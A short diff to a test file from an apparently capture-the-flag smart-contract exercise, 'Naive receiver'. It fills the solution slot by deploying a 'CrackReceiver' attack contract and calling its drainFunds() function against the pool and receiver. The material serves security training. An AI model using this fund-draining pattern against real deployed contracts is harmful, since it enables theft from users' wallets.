@@ -38,6 +38,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        const CrackReceiverFactory = await ethers.getContractFactory('CrackReceiver', player);
+        let crackReceiver = await CrackReceiverFactory.deploy(pool.address, receiver.address);
+        await crackReceiver.drainFunds();
     });
 
     after(async function () {
